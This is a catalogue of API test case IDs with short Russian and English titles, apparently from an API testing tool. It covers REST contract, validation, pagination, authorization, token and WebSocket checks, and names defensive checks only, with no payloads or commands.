REST-EMPTY-VALUES | validation | Пустые объект, массив и строка
REST-ENUM-VALUES | validation | Допустимые и неизвестные enum
REST-ERROR-RETRY-AFTER | contract | Retry-After при временной ошибке
REST-ERROR-SCHEMA | contract | Стабильная схема ошибок
REST-ERROR-STATUS-BODY | contract | Согласованность статуса и тела ошибки
REST-ETAG-IF-MATCH | resilience | Условное обновление If-Match
REST-FILTER-EQUIVALENT-FORMS | pagination | Логически эквивалентные формы фильтра дают одинаковый ответ
REST-FILTER-INVALID | pagination | Невалидный фильтр
REST-FILTER-OPERATION-PARITY | pagination | Один фильтр даёт согласованный результат в списке, агрегации и вложенной выборке
REST-FILTER-OPERATOR-TYPE-MATRIX | pagination | Каждый оператор фильтра работает для каждого допустимого типа поля и возвращает ровно подходящие записи
REST-FILTER-RELATION-NO-DUPLICATES | pagination | Фильтр по полю связанной коллекции возвращает каждую запись один раз
REST-FILTER-SORT-COMPOSITION | pagination | Filtering and sorting compose correctly
REST-FILTER-SORT-PAGINATION | pagination | Комбинация filter/sort/pagination
REST-HEAD-GET-CONSISTENCY | http-semantics | HEAD response is consistent with GET
REST-IDEMPOTENCY-KEY | contract | Повтор с Idempotency-Key
REST-IDEMPOTENCY-RETRY | idempotency | Retry does not duplicate an idempotent operation's effect
REST-JSON-DUPLICATE-KEYS | validation | Дублирующиеся ключи JSON
REST-MASS-ASSIGNMENT | security | Mass assignment защищённых полей
REST-METHOD-NOT-ALLOWED | http-semantics | Unsupported HTTP method is rejected
REST-NULL-VS-OMITTED | validation | Null и отсутствующее поле
REST-NUMERIC-BOUNDARIES | validation | Числовые границы
REST-OBJECT-LEVEL-AUTHZ | security | Object-level authorization
REST-OPEN-REDIRECT | security | Валидация redirect URL
REST-OPTIONAL-EMPTY-VALUE | validation | Отсутствующий и пустой параметр
REST-PAGINATION-BOUNDARIES | pagination | Pagination handles boundary values correctly
REST-PAGINATION-LIMITS | pagination | Границы размера страницы
REST-PAGINATION-STABLE-ORDER | pagination | Стабильный порядок пагинации
REST-PATCH-PARTIAL-UPDATE | contract | Семантика PATCH
REST-PATH-PARAM-ENCODING | contract | Кодирование path-параметров
REST-POST-LOCATION | contract | Location при создании
REST-PUT-REPLACEMENT | contract | Семантика PUT
REST-QUERY-ENCODING | contract | Кодирование query-параметров
REST-RATE-LIMIT | security | Ограничение частоты запросов
REST-READONLY-WRITEONLY | contract | Поля readOnly/writeOnly
REST-REQUEST-SIZE-LIMIT | validation | Лимит размера тела
REST-REQUIRED-PARAM-MISSING | validation | Отсутствует обязательный параметр
REST-RETRY-TRANSIENT-ERROR | contract | Retry после временной ошибки
REST-SECURITY-HEADERS | security | Защитные HTTP-заголовки
REST-SENSITIVE-CACHE-CONTROL | security | Кэширование чувствительных ответов
REST-SENSITIVE-DATA | security | Отсутствие чувствительных данных в ответах
REST-SORT-INVALID-FIELD | pagination | Сортировка по неизвестному полю
REST-SSRF-URL-FETCH | security | Контроль server-side URL fetch
REST-STATE-TRANSITIONS | resources | Переходы состояния ресурса
REST-STATUS-CODE-CONTRACT | contract | Статус ответа соответствует контракту
REST-STRING-LENGTH-BOUNDARIES | validation | Границы длины строки
REST-TIMEOUT-BUDGET | contract | Таймаут и бюджет времени
REST-TYPE-MISMATCH | validation | Несовпадение типа поля
REST-UNICODE-NORMALIZATION | validation | Unicode и нормализация
REST-UNKNOWN-FIELDS | contract | Политика неизвестных полей
REST-UNSUPPORTED-CONTENT-TYPE | validation | Неподдерживаемый Content-Type запроса
REST-VALIDATION-ATOMICITY | contract | Атомарность ошибки валидации
SEC-ALT-REPRESENTATION-ACCESS | security | Закрытый ресурс недоступен ни через одно альтернативное представление
SEC-AUTHN-MALFORMED | security | Malformed credential is rejected
SEC-AUTHN-MISSING | security | Protected operation rejects missing credentials
SEC-AUTHN-SCHEMES-SUPPORTED | security | Все задокументированные схемы Authorization принимаются на своих эндпоинтах
SEC-AUTHZ-ASYNC-JOB | security | Authorization is rechecked for asynchronous job access
SEC-AUTHZ-CACHE-ISOLATION | security | Authorization context is respected by caches
SEC-AUTHZ-DYNAMIC-VARIABLES | security | Динамические переменные в правилах доступа действуют как эквивалентные статические значения
SEC-AUTHZ-ERROR-LEAK | security | Authorization failures do not disclose protected data
SEC-AUTHZ-EXPLICIT-OVER-INHERITED | security | Явное пониженное право на дочерний объект имеет приоритет над унаследованным
SEC-AUTHZ-FUNCTION | security | User without required permission cannot invoke operation
SEC-AUTHZ-LIST-CHECK-CONSISTENCY | security | Перечисление субъектов и объектов с доступом согласовано с точечной проверкой
SEC-AUTHZ-METHOD-MATRIX | security | Authorization is enforced for every method
SEC-AUTHZ-PATH-RULE-PRECEDENCE | security | Правила доступа по путям применяются по наиболее точному совпадению, независимо от порядка объявления
SEC-AUTHZ-RECREATED-IDENTITY | security | Права и согласия не переходят к пересозданному пользователю с тем же логином
SEC-AUTHZ-REVOKE-ROLE | security | Role revocation takes effect within policy window
SEC-AUTHZ-ROLE-POSITIVE-MATRIX | security | Разрешённая операция работает для каждой роли с правом, а не только для администратора
SEC-AUTHZ-RULE-READ-WRITE-PARITY | security | Условие прав по связанной записи действует в записи так же, как в чтении
SEC-BOLA-BULK | security | Bulk endpoint enforces ownership per item
SEC-CLONE-FIELD-PERMISSIONS | security | Копирование ресурса соблюдает полевые права чтения и создания
SEC-CONFUSED-DEPUTY | security | Действия во внешней системе от имени пользователя выполняются только с его правами
SEC-DISABLED-FEATURE-ENFORCED | security | Отключённая настройкой функция недоступна через все API и не попадает в токены
SEC-FAIL-CLOSED-INPUT | security | Неожиданный тип, пустое или отсутствующее поле проверки безопасности ведёт к отказу, а не к пропуску проверки
SEC-HORIZONTAL-ESCALATION | security | Peer user cannot access peer-only protected action
SEC-IDENTITY-PROOF-OF-POSSESSION | security | Заявленная клиентом идентичность без доказательства владения не даёт прав и льгот
SEC-INTERNAL-CONTROL-PARAMS | security | Заголовки и параметры подключения клиента не задают внутренние управляющие параметры операции
SEC-OPAQUE-ID-INTEGRITY | security | Непрозрачный идентификатор, выданный сервером, проверяется на подлинность
SEC-OWNERSHIP-DELETE | security | User cannot delete another owner’s resource
SEC-OWNERSHIP-EXPORT | security | Export/report endpoints enforce ownership and tenant boundaries
SEC-OWNERSHIP-READ | security | User cannot read another owner’s resource
SEC-OWNERSHIP-REFERENCE-INDIRECT | security | Indirect resource references preserve authorization
SEC-OWNERSHIP-UPDATE | security | User cannot modify another owner’s resource
SEC-POLICY-TEMPLATE-USER-DATA | security | Данные пользователя, подставляемые в шаблон политики доступа, не работают как wildcard
SEC-READONLY-MODE-ENFORCED | security | Режим только для чтения запрещает изменения любым запросом, а не по первому ключевому слову
SEC-ROLE-ADMIN-SELF-TARGET | security | Административная операция над собственной учёткой обрабатывается по политике без 5xx
SEC-ROLE-BULK-ADMIN | security | Bulk admin actions require privilege for every target
SEC-ROLE-LOW-TO-HIGH | security | Low-privilege role cannot perform privileged action
SEC-ROLE-MASS-ASSIGN | security | Mass assignment cannot elevate privileges
SEC-ROLE-SELF-ASSIGN | security | User cannot grant self a higher role
SEC-SCOPE-EXTRA-UNTRUSTED | security | Client cannot add scopes by request parameter
SEC-SCOPE-MISSING | security | Token without required scope is denied
SEC-TENANT-CREATE | security | Client cannot assign resource to another tenant
SEC-TENANT-HEADER-SPOOF | security | Untrusted tenant header cannot override identity context
SEC-TENANT-READ | security | Tenant A cannot read tenant B data
SEC-TENANT-SEARCH | security | Tenant filter cannot be bypassed in list/search
SEC-TENANT-WRITE | security | Tenant A cannot mutate tenant B data
SEC-TOKEN-AUDIENCE | security | Token for another audience is rejected
SEC-TOKEN-EXPIRED | security | Expired access token is rejected
SEC-TOKEN-ISSUER | security | Token from untrusted issuer is rejected
SEC-TOKEN-REFRESH-REPLAY | security | Refresh-token replay is rejected or rotated
SEC-TOKEN-REVOKED | security | Revoked token cannot be reused
SEC-TOKEN-SIGNATURE | security | Token with invalid signature is rejected
SEC-VERTICAL-ESCALATION | security | Lower role cannot invoke higher-role route via alternate method
SECURITY-AUTH-REQUIRED | security | Protected operation rejects unauthenticated requests
SECURITY-AUTHZ-CROSS-USER | security | User cannot access another user's resource
VAL-ALL-ERRORS-REPORTED | validation | Ошибки валидации нескольких полей возвращаются по контракту (все сразу или первая)
VAL-ARRAY-ITEMS-BOUNDARIES | validation | Границы массивов: minItems, maxItems, uniqueItems
VAL-BODY-ENCODING | validation | Тело в неверной кодировке или с BOM обрабатывается предсказуемо
VAL-BOOLEAN-COERCION | validation | Неявное приведение типов для boolean не происходит
VAL-CASE-SENSITIVITY | validation | Чувствительность к регистру идентификаторов, email и enum соответствует контракту
VAL-DEEP-NESTING | validation | Чрезмерно вложенный JSON отклоняется без деградации сервиса
VAL-DEFAULT-VALUES | validation | Опущенные необязательные поля получают задокументированные значения по умолчанию
VAL-DEFERRED-FAILURE | validation | Принятые при записи данные не вызывают 5xx в зависимых операциях
VAL-DEPENDENT-FIELDS | validation | Взаимозависимые поля валидируются совместно
VAL-DYNAMIC-VARIABLES-TYPE | validation | Правило валидации с динамической переменной сравнивает значения по типу поля
VAL-JSON-TOP-LEVEL-TYPE | validation | Неожиданный тип корня JSON отклоняется
VAL-LARGE-COLLECTION-PAYLOAD | validation | Массив с очень большим числом элементов отклоняется или обрабатывается в пределах лимитов
VAL-MALFORMED-JSON | validation | Синтаксически некорректный JSON отклоняется
VAL-MONEY-AMOUNT | validation | Денежные суммы: знак, точность и валюта валидируются
VAL-NESTED-OBJECT-ERRORS | validation | Ошибка во вложенном объекте указывает точный путь к полю
VAL-NUMBER-REPRESENTATION | validation | Альтернативные записи чисел обрабатываются по контракту
VAL-PATH-ID-FORMAT | validation | Неверный формат идентификатора в пути не вызывает 5xx
VAL-QUERY-ARRAY-FORMAT | validation | Массивы в query передаются в задокументированном формате
VAL-QUERY-PARAM-POLLUTION | validation | Дублирующиеся query-параметры обрабатываются однозначно
VAL-RANGE-ORDER | validation | Начало диапазона не может быть позже конца
VAL-REGEX-PATTERN | validation | Поле с pattern принимает только совпадающие значения
VAL-REQUIRED-HEADERS | validation | Обязательные и форматные заголовки валидируются
VAL-SPECIAL-CHARACTERS | validation | Спецсимволы, emoji и управляющие символы сохраняются или отклоняются корректно
VAL-STRING-FORMAT | validation | Форматы строк (email, uuid, uri, date, phone) проверяются
VAL-TIGHTENED-RULES-STORED-DATA | validation | Сохранённые до ужесточения валидации значения обрабатываются одинаково на всех путях записи
VAL-UPLOADED-SCHEMA-FORMATS | validation | Загружаемая клиентом схема с документированными форматами принимается без ложных предупреждений
VAL-WHITESPACE-HANDLING | validation | Пробелы по краям и строки из пробелов обрабатываются согласованно
WS-HANDSHAKE-AUTH | websocket | Установление соединения требует аутентификации
WS-MALFORMED-MESSAGE | websocket | Некорректные сообщения не рвут соединение без ответа
WS-MESSAGE-LIMITS | websocket | Размер и частота сообщений ограничены
WS-MULTIPLE-ENDPOINTS-INDEPENDENT | websocket | Несколько WebSocket-эндпоинтов на разных путях работают независимо
WS-ORIGIN-CHECK | websocket | Проверка Origin защищает от cross-site WebSocket hijacking
WS-RECONNECT-RESUME | websocket | Переподключение восстанавливает подписки без потери и дублей сверх контракта
WS-SLOW-CONSUMER-NO-SILENT-LOSS | websocket | Медленный клиент подписки не теряет сообщения молча
WS-SUBSCRIPTION-AUTHZ | websocket | Подписки и сообщения авторизуются по каждому каналу
WS-SUBSCRIPTION-EVENTS-DELIVERED | websocket | Подписка получает события создания, изменения и удаления
WS-TOKEN-EXPIRY | websocket | Истечение или отзыв токена учитывается в открытом соединении
```
